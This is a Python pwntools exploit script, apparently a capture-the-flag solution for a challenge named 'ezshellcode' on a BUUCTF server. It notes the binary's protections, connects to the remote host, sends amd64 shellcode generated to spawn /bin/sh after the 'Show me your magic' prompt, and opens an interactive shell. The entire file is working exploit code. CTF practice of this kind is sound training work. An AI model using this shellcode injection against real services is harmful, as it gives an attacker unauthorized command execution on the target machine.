'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "26112" 
filename = "./ezshellcode"
elf = ELF(filename)
# libc = ELF("")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()


def pwn():
    payload = asm(pwnlib.shellcraft.amd64.linux.sh())
    print('payload length: {}'.format(len(payload)))
    io.sendlineafter(b'Show me your magic\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
